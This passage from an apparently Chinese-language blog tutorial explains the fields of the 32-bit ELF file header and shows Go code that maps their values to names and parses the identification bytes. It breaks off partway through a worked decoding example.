align="center">Elf32_Half</td></tr><tr><td align="center">e_version</td><td align="center">Elf32_Word</td></tr><tr><td align="center">e_entry</td><td align="center">Elf32_Addr</td></tr><tr><td align="center">e_phoff</td><td align="center">Elf32_Off</td></tr><tr><td align="center">e_shoff</td><td align="center">Elf32_Off</td></tr><tr><td align="center">e_flags</td><td align="center">Elf32_Word</td></tr><tr><td align="center">e_ehsize</td><td align="center">Elf32_Half</td></tr><tr><td align="center">e_phentsize</td><td align="center">Elf32_Half</td></tr><tr><td align="center">e_phnum</td><td align="center">Elf32_Half</td></tr><tr><td align="center">e_shentsize</td><td align="center">Elf32_Half</td></tr><tr><td align="center">e_shnum</td><td align="center">Elf32_Half</td></tr><tr><td align="center">e_shstrndx</td><td align="center">Elf32_Half</td></tr></tbody></table><p>最后程序中的样子，对于e_ident我做一了点修改为了方便后续程序编写：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Elf32_Ehdr <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//e_ident [EI_NIDENT]u_char</span></span><br><span class="line">Ehdr_Magic <span class="keyword">string</span></span><br><span class="line">Ehdr_Class <span class="keyword">int</span></span><br><span class="line">Ehdr_Data <span class="keyword">int</span></span><br><span class="line">Ehdr_Version <span class="keyword">int</span></span><br><span class="line">Ehdr_OS <span class="keyword">int</span></span><br><span class="line">Ehdr_ABIV <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">e_ident 这是一个数组,其每个字节又都有所代表的含义</span></span><br><span class="line"><span class="comment">EI_MAG0 - EI_MAG3 文件标识就是平时所说的ELF头</span></span><br><span class="line"><span class="comment">EI_CLASS 文件类,其实代表的是32位/64位程序</span></span><br><span class="line"><span class="comment">EI_DATA 数据编码,一般都是01[td]</span></span><br><span class="line"><span class="comment">EI_VERSION 文件版本,固定值01 EV_CURRENT</span></span><br><span class="line"><span class="comment">EI_PAD 呃…就是一堆全是00的用来补全大小的数组</span></span><br><span class="line"><span class="comment">EI_NIDENT 说是e_ident数组的大小,但我看了好几个so都是00</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">e_type Elf32_Half</span><br><span class="line"><span class="comment">//标识文件类型</span></span><br><span class="line">e_machine Elf32_Half</span><br><span class="line"><span class="comment">//声明ABI</span></span><br><span class="line">e_version Elf32_Word</span><br><span class="line"><span class="comment">//跟ident[]里的EI_VERSION一样,为01</span></span><br><span class="line">e_entry Elf32_Addr</span><br><span class="line"><span class="comment">//可执行程序入口点地址</span></span><br><span class="line">e_phoff Elf32_Off</span><br><span class="line"><span class="comment">//Program Header Offset,程序头部表索引地址,没有则为0</span></span><br><span class="line">e_shoff Elf32_Off</span><br><span class="line"><span class="comment">//Section Header Offset,节区表索引地址,没有则为0</span></span><br><span class="line">e_flags Elf32_Word</span><br><span class="line"><span class="comment">//保存与文件相关的，特定于处理器的标志。</span></span><br><span class="line">e_ehsize Elf32_Half</span><br><span class="line"><span class="comment">//ELF_Header Size,ELF头部的大小</span></span><br><span class="line">e_phentsize Elf32_Half</span><br><span class="line"><span class="comment">//程序头部表的单个表项的大小</span></span><br><span class="line">e_phnum Elf32_Half</span><br><span class="line"><span class="comment">//程序头部表的表项数</span></span><br><span class="line">e_shentsize Elf32_Half</span><br><span class="line"><span class="comment">//节区表的单个表项的大小</span></span><br><span class="line">e_shnum Elf32_Half</span><br><span class="line"><span class="comment">//节区表的表项数</span></span><br><span class="line">e_shstrndx Elf32_Half</span><br><span class="line"><span class="comment">//String Table Index,在节区表中有一个存储各节区名称的节区,这里表示名称表在第几个节区。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面开始逐步解释各个字段</p><h4 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h4><p><strong>目标文件标识</strong>。详细描述该二进制文件对应的体系结构，其每个字节又都有所代表的含义，包括对应的字长，CPU架构，大小端</p><h5 id="EI-MAG0-EI-MAG3（文件标识）"><a href="#EI-MAG0-EI-MAG3（文件标识）" class="headerlink" title="EI_MAG0 - EI_MAG3（文件标识）"></a>EI_MAG0 - EI_MAG3（文件标识）</h5><p>默认值就是：7F 45 4C 46，即ELF</p><h5 id="EI-CLASS（文件类）"><a href="#EI-CLASS（文件类）" class="headerlink" title="EI_CLASS（文件类）"></a>EI_CLASS（文件类）</h5><table><thead><tr><th align="center">取值</th><th align="center">代表</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">01</td><td align="center">ELFCLASS32</td><td align="center">32位程序</td></tr><tr><td align="center">02</td><td align="center">ELFCLASS64</td><td align="center">64位程序</td></tr></tbody></table><p>Go代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EhdrClass := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">1</span>: <span class="string">"ELF32"</span>,</span><br><span class="line"><span class="number">2</span>: <span class="string">"ELF64"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="EI-DATA（数据编码）"><a href="#EI-DATA（数据编码）" class="headerlink" title="EI_DATA（数据编码）"></a>EI_DATA（数据编码）</h5><table><thead><tr><th align="center">取值</th><th align="center">代表</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">01</td><td align="center">ELFDATA2LSB</td><td align="center">小端序</td></tr><tr><td align="center">02</td><td align="center">ELFDATA2MSB</td><td align="center">大端序</td></tr></tbody></table><p>Go代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EhdrData := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">1</span>:<span class="string">"2's complement, little endian"</span>,</span><br><span class="line"><span class="number">2</span>:<span class="string">"2's complement, big endian"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="EI-VERSION-文件版本"><a href="#EI-VERSION-文件版本" class="headerlink" title="EI_VERSION(文件版本)"></a>EI_VERSION(文件版本)</h5><p>固定值01 <strong>EV_CURRENT</strong></p><p>Go代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EhdrVersion := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">1</span>:<span class="string">"1 (current)"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="EI-OSABI-OS类型"><a href="#EI-OSABI-OS类型" class="headerlink" title="EI_OSABI(OS类型)"></a>EI_OSABI(OS类型)</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">EhdrOSABI := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0x0</span> : <span class="string">"UNIX - System V"</span>,</span><br><span class="line"><span class="number">0x1</span> : <span class="string">"Hewlett-Packard HP-UX"</span>,</span><br><span class="line"><span class="number">0x2</span> : <span class="string">"NetBSD"</span>,</span><br><span class="line"><span class="number">0x3</span> : <span class="string">"Linux"</span>,</span><br><span class="line"><span class="number">0x6</span> : <span class="string">"Sun Solaris"</span>,</span><br><span class="line"><span class="number">0x7</span> : <span class="string">"AIX"</span>,</span><br><span class="line"><span class="number">0x8</span> : <span class="string">"IRIX"</span>,</span><br><span class="line"><span class="number">0x9</span> : <span class="string">"FreeBSD"</span>,</span><br><span class="line"><span class="number">0xA</span> : <span class="string">"Compaq TRU64 UNIX"</span>,</span><br><span class="line"><span class="number">0xB</span> : <span class="string">"Novell Modesto"</span>,</span><br><span class="line"><span class="number">0xC</span> : <span class="string">"Open BSD"</span>,</span><br><span class="line"><span class="number">0xD</span> : <span class="string">"Open VMS"</span>,</span><br><span class="line"><span class="number">0xE</span> : <span class="string">"Hewlett-Packard Non-Stop Kernel"</span>,</span><br><span class="line"><span class="number">0xF</span> : <span class="string">"Amiga Research OS"</span>,</span><br><span class="line"><span class="number">0x40</span>: <span class="string">"ARM EABI"</span>,</span><br><span class="line"><span class="number">0x61</span>: <span class="string">"ARM"</span>,</span><br><span class="line"><span class="number">0xFF</span>: <span class="string">"Standalone (embedded applications)"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="EI-ABIVERSION"><a href="#EI-ABIVERSION" class="headerlink" title="EI_ABIVERSION"></a>EI_ABIVERSION</h5><p>ABI版本</p><h5 id="EI-PAD"><a href="#EI-PAD" class="headerlink" title="EI_PAD"></a>EI_PAD</h5><p>为保留字节的开始，默认为0</p><h5 id="EI-NIDENT"><a href="#EI-NIDENT" class="headerlink" title="EI_NIDENT"></a>EI_NIDENT</h5><p>e_ident数组的大小，但一般默认值为0</p><p>最后可以得到解析e_ident的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Ehdr Elf32_Ehdr)</span> <span class="title">ReadMagic</span><span class="params">(data []<span class="keyword">byte</span>)</span><span class="title">Elf32_Ehdr</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> MagicNum = data[:<span class="number">16</span>]</span><br><span class="line"><span class="comment">//Ehdr.e_ident = u_char(MagicNum)</span></span><br><span class="line"><span class="keyword">for</span> _,value := <span class="keyword">range</span> MagicNum&#123;</span><br><span class="line">Ehdr.Ehdr_Magic += Change.DecHex(<span class="keyword">int64</span>(value))</span><br><span class="line">Ehdr.Ehdr_Magic += <span class="string">" "</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Ehdr_Class</span></span><br><span class="line">Ehdr.Ehdr_Class = <span class="keyword">int</span>(MagicNum[<span class="number">4</span>])</span><br><span class="line"><span class="comment">//Ehdr_Data</span></span><br><span class="line">Ehdr.Ehdr_Data = <span class="keyword">int</span>(MagicNum[<span class="number">5</span>])</span><br><span class="line"><span class="comment">//Ehdr_Version</span></span><br><span class="line">Ehdr.Ehdr_Version = <span class="keyword">int</span>(MagicNum[<span class="number">6</span>])</span><br><span class="line"><span class="comment">//Ehdr_OS</span></span><br><span class="line">Ehdr.Ehdr_OS = <span class="keyword">int</span>(MagicNum[<span class="number">7</span>])</span><br><span class="line"><span class="comment">//Ehdr_ABIV</span></span><br><span class="line">Ehdr.Ehdr_ABIV = <span class="keyword">int</span>(MagicNum[<span class="number">8</span>])</span><br><span class="line"><span class="keyword">return</span> Ehdr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h4><p>目标文件类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">EhdrType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0x0</span> : <span class="string">"NONE"</span>,<span class="comment">//No file type</span></span><br><span class="line"><span class="number">0x1</span> : <span class="string">"REL"</span>,<span class="comment">//Relocatable</span></span><br><span class="line"><span class="number">0x2</span> : <span class="string">"EXEC"</span>,<span class="comment">//Executable</span></span><br><span class="line"><span class="number">0x3</span> : <span class="string">"DYN"</span>,<span class="comment">//Shared object</span></span><br><span class="line"><span class="number">0x4</span> : <span class="string">"CORE"</span>,<span class="comment">//Core</span></span><br><span class="line"><span class="number">0xfe00</span> : <span class="string">"LOOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line"><span class="number">0xfeff</span> : <span class="string">"HIOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line"><span class="number">0xff00</span> : <span class="string">"LOPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line"><span class="number">0xffff</span> : <span class="string">"HIPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h4><p>文件的目标体系结构类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">EhdrMachine := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0</span> : <span class="string">"No machine"</span>,</span><br><span class="line"><span class="number">1</span> : <span class="string">"AT&amp;T WE 32100"</span>,</span><br><span class="line"><span class="number">2</span> : <span class="string">"SPARC"</span>,</span><br><span class="line"><span class="number">3</span> : <span class="string">"Intel 80386"</span>,</span><br><span class="line"><span class="number">4</span> : <span class="string">"Motorola 68000"</span>,</span><br><span class="line"><span class="number">5</span> : <span class="string">"Motorola 88000"</span>,</span><br><span class="line"><span class="number">6</span> : <span class="string">"Reserved for future use (was EM_486)"</span>,</span><br><span class="line"><span class="number">7</span> : <span class="string">"Intel 80860"</span>,</span><br><span class="line"><span class="number">8</span> : <span class="string">"MIPS I Architecture"</span>,</span><br><span class="line"><span class="number">9</span> : <span class="string">"IBM System/370 Processor"</span>,</span><br><span class="line"><span class="number">10</span> : <span class="string">"MIPS RS3000 Little-endian"</span>,</span><br><span class="line"><span class="number">11</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">12</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">13</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">14</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">15</span> : <span class="string">"Hewlett-Packard PA-RISC"</span>,</span><br><span class="line"><span class="number">16</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">17</span> : <span class="string">"Fujitsu VPP500"</span>,</span><br><span class="line"><span class="number">18</span> : <span class="string">"Enhanced instruction set SPARC"</span>,</span><br><span class="line"><span class="number">19</span> : <span class="string">"Intel 80960"</span>,</span><br><span class="line"><span class="number">20</span> : <span class="string">"PowerPC"</span>,</span><br><span class="line"><span class="number">21</span> : <span class="string">"64-bit PowerPC"</span>,</span><br><span class="line"><span class="number">22</span> : <span class="string">"IBM System/390 Processor"</span>,</span><br><span class="line"><span class="number">23</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">24</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">25</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">26</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">27</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">28</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">29</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">30</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">31</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">32</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">33</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">34</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">35</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line"><span class="number">36</span> : <span class="string">"NEC V800"</span>,</span><br><span class="line"><span class="number">37</span> : <span class="string">"Fujitsu FR20"</span>,</span><br><span class="line"><span class="number">38</span> : <span class="string">"TRW RH-32"</span>,</span><br><span class="line"><span class="number">39</span> : <span class="string">"Motorola RCE"</span>,</span><br><span class="line"><span class="number">40</span> : <span class="string">"Advanced RISC Machines ARM"</span>,</span><br><span class="line"><span class="number">41</span> : <span class="string">"Digital Alpha"</span>,</span><br><span class="line"><span class="number">42</span> : <span class="string">"Hitachi SH"</span>,</span><br><span class="line"><span class="number">43</span> : <span class="string">"SPARC Version 9"</span>,</span><br><span class="line"><span class="number">44</span> : <span class="string">"Siemens TriCore embedded processor"</span>,</span><br><span class="line"><span class="number">45</span> : <span class="string">"Argonaut RISC Core, Argonaut Technologies Inc."</span>,</span><br><span class="line"><span class="number">46</span> : <span class="string">"Hitachi H8/300"</span>,</span><br><span class="line"><span class="number">47</span> : <span class="string">"Hitachi H8/300H"</span>,</span><br><span class="line"><span class="number">48</span> : <span class="string">"Hitachi H8S"</span>,</span><br><span class="line"><span class="number">49</span> : <span class="string">"Hitachi H8/500"</span>,</span><br><span class="line"><span class="number">50</span> : <span class="string">"Intel IA-64 processor architecture"</span>,</span><br><span class="line"><span class="number">51</span> : <span class="string">"Stanford MIPS-X"</span>,</span><br><span class="line"><span class="number">52</span> : <span class="string">"Motorola ColdFire"</span>,</span><br><span class="line"><span class="number">53</span> : <span class="string">"Motorola M68HC12"</span>,</span><br><span class="line"><span class="number">54</span> : <span class="string">"Fujitsu MMA Multimedia Accelerator"</span>,</span><br><span class="line"><span class="number">55</span> : <span class="string">"Siemens PCP"</span>,</span><br><span class="line"><span class="number">56</span> : <span class="string">"Sony nCPU embedded RISC processor"</span>,</span><br><span class="line"><span class="number">57</span> : <span class="string">"Denso NDR1 microprocessor"</span>,</span><br><span class="line"><span class="number">58</span> : <span class="string">"Motorola Star*Core processor"</span>,</span><br><span class="line"><span class="number">59</span> : <span class="string">"Toyota ME16 processor"</span>,</span><br><span class="line"><span class="number">60</span> : <span class="string">"STMicroelectronics ST100 processor"</span>,</span><br><span class="line"><span class="number">61</span> : <span class="string">"Advanced Logic Corp. TinyJ embedded processor family"</span>,</span><br><span class="line"><span class="number">62</span> : <span class="string">"AMD x86-64 architecture"</span>,</span><br><span class="line"><span class="number">63</span> : <span class="string">"Sony DSP Processor"</span>,</span><br><span class="line"><span class="number">64</span> : <span class="string">"Digital Equipment Corp. PDP-10"</span>,</span><br><span class="line"><span class="number">65</span> : <span class="string">"Digital Equipment Corp. PDP-11"</span>,</span><br><span class="line"><span class="number">66</span> : <span class="string">"Siemens FX66 microcontroller"</span>,</span><br><span class="line"><span class="number">67</span> : <span class="string">"STMicroelectronics ST9+ 8/16 bit microcontroller"</span>,</span><br><span class="line"><span class="number">68</span> : <span class="string">"STMicroelectronics ST7 8-bit microcontroller"</span>,</span><br><span class="line"><span class="number">69</span> : <span class="string">"Motorola MC68HC16 Microcontroller"</span>,</span><br><span class="line"><span class="number">70</span> : <span class="string">"Motorola MC68HC11 Microcontroller"</span>,</span><br><span class="line"><span class="number">71</span> : <span class="string">"Motorola MC68HC08 Microcontroller"</span>,</span><br><span class="line"><span class="number">72</span> : <span class="string">"Motorola MC68HC05 Microcontroller"</span>,</span><br><span class="line"><span class="number">73</span> : <span class="string">"Silicon Graphics SVx"</span>,</span><br><span class="line"><span class="number">75</span> : <span class="string">"Digital VAX"</span>,</span><br><span class="line"><span class="number">76</span> : <span class="string">"Axis Communications 32-bit embedded processor"</span>,</span><br><span class="line"><span class="number">77</span> : <span class="string">"Infineon Technologies 32-bit embedded processor"</span>,</span><br><span class="line"><span class="number">78</span> : <span class="string">"Element 14 64-bit DSP Processor"</span>,</span><br><span class="line"><span class="number">79</span> : <span class="string">"LSI Logic 16-bit DSP Processor"</span>,</span><br><span class="line"><span class="number">80</span> : <span class="string">"Donald Knuth's educational 64-bit processor"</span>,</span><br><span class="line"><span class="number">81</span> : <span class="string">"Harvard University machine-independent object files"</span>,</span><br><span class="line"><span class="number">82</span> : <span class="string">"SiTera Prism"</span>,</span><br><span class="line"><span class="number">83</span> : <span class="string">"Atmel AVR 8-bit microcontroller"</span>,</span><br><span class="line"><span class="number">84</span> : <span class="string">"Fujitsu FR30"</span>,</span><br><span class="line"><span class="number">85</span> : <span class="string">"Mitsubishi D10V"</span>,</span><br><span class="line"><span class="number">86</span> : <span class="string">"Mitsubishi D30V"</span>,</span><br><span class="line"><span class="number">87</span> : <span class="string">"NEC v850"</span>,</span><br><span class="line"><span class="number">88</span> : <span class="string">"Mitsubishi M32R"</span>,</span><br><span class="line"><span class="number">89</span> : <span class="string">"Matsushita MN10300"</span>,</span><br><span class="line"><span class="number">90</span> : <span class="string">"Matsushita MN10200"</span>,</span><br><span class="line"><span class="number">91</span> : <span class="string">"picoJava"</span>,</span><br><span class="line"><span class="number">92</span> : <span class="string">"OpenRISC 32-bit embedded processor"</span>,</span><br><span class="line"><span class="number">93</span> : <span class="string">"ARC Cores Tangent-A5"</span>,</span><br><span class="line"><span class="number">94</span> : <span class="string">"Tensilica Xtensa Architecture"</span>,</span><br><span class="line"><span class="number">95</span> : <span class="string">"Alphamosaic VideoCore processor"</span>,</span><br><span class="line"><span class="number">96</span> : <span class="string">"Thompson Multimedia General Purpose Processor"</span>,</span><br><span class="line"><span class="number">97</span> : <span class="string">"National Semiconductor 32000 series"</span>,</span><br><span class="line"><span class="number">98</span> : <span class="string">"Tenor Network TPC processor"</span>,</span><br><span class="line"><span class="number">99</span> : <span class="string">"Trebia SNP 1000 processor"</span>,</span><br><span class="line"><span class="number">100</span> : <span class="string">"STMicroelectronics (www.st.com) ST200 microcontroller"</span>,</span><br><span class="line"><span class="number">101</span> : <span class="string">"Ubicom IP2xxx microcontroller family"</span>,</span><br><span class="line"><span class="number">102</span> : <span class="string">"MAX Processor"</span>,</span><br><span class="line"><span class="number">103</span> : <span class="string">"National Semiconductor CompactRISC microprocessor"</span>,</span><br><span class="line"><span class="number">104</span> : <span class="string">"Fujitsu F2MC16"</span>,</span><br><span class="line"><span class="number">105</span> : <span class="string">"Texas Instruments embedded microcontroller msp430"</span>,</span><br><span class="line"><span class="number">106</span> : <span class="string">"Analog Devices Blackfin (DSP) processor"</span>,</span><br><span class="line"><span class="number">107</span> : <span class="string">"S1C33 Family of Seiko Epson processors"</span>,</span><br><span class="line"><span class="number">108</span> : <span class="string">"Sharp embedded microprocessor"</span>,</span><br><span class="line"><span class="number">109</span> : <span class="string">"Arca RISC Microprocessor"</span>,</span><br><span class="line"><span class="number">110</span> : <span class="string">"Microprocessor series from PKU-Unity Ltd. and MPRC of Peking University"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h4><p>目标文件版本。固定值01 <strong>EV_CURRENT</strong></p><h4 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h4><p>程序入口的虚拟地址</p><h4 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h4><p>Program Header Table的偏移地址，即程序头部表索引地址</p><h4 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h4><p>Section Header Table的偏移地址，即节区表索引地址</p><h4 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h4><p>处理器相关标识</p><h4 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h4><p>ELF Header的大小</p><h4 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h4><p>Program Header Entry的大小，即程序头部表的单个表项的大小</p><h4 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h4><p>Program Header Entry的数目，即程序头部表的表项数</p><h4 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h4><p>Section Header Entry的大小，即节区表的单个表项的大小</p><h4 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h4><p>Section Header Entry的数目，即节区表的表项数</p><h4 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h4><p>即节区名称表(.shstrtab)位于节区表的位置，用于索引节区的名字</p><h3 id="读取ELF-Header"><a href="#读取ELF-Header" class="headerlink" title="读取ELF Header"></a>读取ELF Header</h3><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>例如有一个ELF Header的二进制数据为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7E 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">02 00 03 00 01 00 00 00 10 83 04 08 34 00 00 00</span><br><span class="line">E0 17 00 00 00 00 00 00 34 00 20 00 09 00 28 00</span><br><span class="line">1F 00 1C 00</span><br></pre></td></tr></table></figure><p>那么e_ident即为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7E 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">名称</th><th align="center">值</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">Ehdr_Class</td><td align="center">01</td><td align="center">ELF32</td></tr><tr><td align="center">Ehdr_Data</td><td align="center">01</td><td align="center">2’s complement, little endian</td></tr><tr><td align="center">Ehdr_Version</td><td align="center">01</td><td align="center">1 (current)</td></tr><tr><td align="center">Ehdr_OS</td><td align="center">00</td><td align="center">UNIX - System V</td></tr><tr><td align="center">Ehdr_ABIV</td><td align="center">00</td><td 